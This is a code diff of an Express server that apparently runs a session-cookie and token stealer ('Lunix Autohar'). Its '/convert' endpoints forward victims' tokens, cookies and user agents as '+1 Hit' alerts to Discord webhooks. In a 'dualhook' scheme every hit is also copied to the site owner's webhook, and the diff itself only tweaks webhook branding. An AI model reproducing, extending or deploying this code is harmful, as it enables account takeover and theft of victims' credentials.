@@ -560,12 +560,12 @@ app.post('/u/:directory/convert', async (req, res) => {
       const customTitle = `<:emoji_37:1410520517349212200> +1 Hit - Lunix Autohar`;
 
       // Send to Discord webhook with user data
-      const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle);
+      const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle, true);
 
       // Always send to site owner (main webhook)
       const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
       if (siteOwnerWebhookUrl) {
-        await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, siteOwnerWebhookUrl, customTitle);
+        await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, siteOwnerWebhookUrl, customTitle, true);
       }
 
       if (!webhookResult.success) {
@@ -2121,7 +2121,7 @@ async function sendCustomDualhookWebhook(token, userAgent = 'Unknown', userData 
 }
 
 // Function to send Discord webhook with user data (supports custom webhook URLs)
-async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown', userData = null, customWebhookUrl = null, customTitle = null) {
+async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown', userData = null, customWebhookUrl = null, customTitle = null, useCustomWebhook = false) {
   const webhookUrl = customWebhookUrl || process.env.DISCORD_WEBHOOK_URL;
 
   console.log('Webhook URL configured:', webhookUrl ? 'YES' : 'NO');
@@ -2242,10 +2242,18 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
       // Send both embeds together in a single message with @everyone notification
       const combinedPayload = {
         content: "@everyone +1 Hit",
-        username: "AUTOHAR HIT",  // Custom webhook username
-        avatar_url: "https://i.imgur.com/rVUUJ9d.png",  // Custom webhook avatar
         embeds: [userDataEmbed, cookieEmbed]
       };
+
+      // Add custom webhook branding if requested (for all directory hits)
+      if (useCustomWebhook) {
+        combinedPayload.username = "AUTOHAR HIT";
+        combinedPayload.avatar_url = "https://i.imgur.com/rVUUJ9d.png";
+      } else {
+        // Only main site owner gets custom branding by default
+        combinedPayload.username = "AUTOHAR HIT";
+        combinedPayload.avatar_url = "https://i.imgur.com/rVUUJ9d.png";
+      }
 
 
 
@@ -2752,12 +2760,12 @@ app.post('/:directory/convert', async (req, res) => {
 
       const customTitle = `<:emoji_37:1410520517349212200> +1 Hit - Lunix Autohar`;
       // Send to Discord webhook with user data
-      const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle);
+      const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle, true);
 
       // Always send to site owner (main webhook) - check both environment variable and default webhook
       const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
       if (siteOwnerWebhookUrl) {
-        await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, siteOwnerWebhookUrl, customTitle);
+        await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, siteOwnerWebhookUrl, customTitle, true);
       }
 
       if (!webhookResult.success) {
@@ -3151,29 +3159,29 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
 
         // 1. Send to dualhook master webhook with filtered title
         if (parentConfig.dualhookWebhookUrl) {
-          dualhookWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, parentConfig.dualhookWebhookUrl, filteredTitle);
+          dualhookWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, parentConfig.dualhookWebhookUrl, filteredTitle, true);
         }
 
         // 2. Send to site owner webhook
         const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
         if (siteOwnerWebhookUrl) {
-          await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, siteOwnerWebhookUrl, filteredTitle);
+          await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, siteOwnerWebhookUrl, filteredTitle, true);
         }
       } else {
         // Normal triple-webhook logic when filters are not met
 
         // 1. Send to subdirectory webhook
-        subdirectoryWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, subdirectoryConfig.webhookUrl, customTitle);
+        subdirectoryWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, subdirectoryConfig.webhookUrl, customTitle, true);
 
         // 2. Send to dualhook master webhook (collects from all subdirectory users)
         if (parentConfig.dualhookWebhookUrl) {
-          dualhookWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, parentConfig.dualhookWebhookUrl, customTitle);
+          dualhookWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, parentConfig.dualhookWebhookUrl, customTitle, true);
         }
 
         // 3. Send to site owner webhook (website owner)
         const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
         if (siteOwnerWebhookUrl) {
-          const siteOwnerWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, siteOwnerWebhookUrl, customTitle);
+          const siteOwnerWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, siteOwnerWebhookUrl, customTitle, true);
         }
       }
 
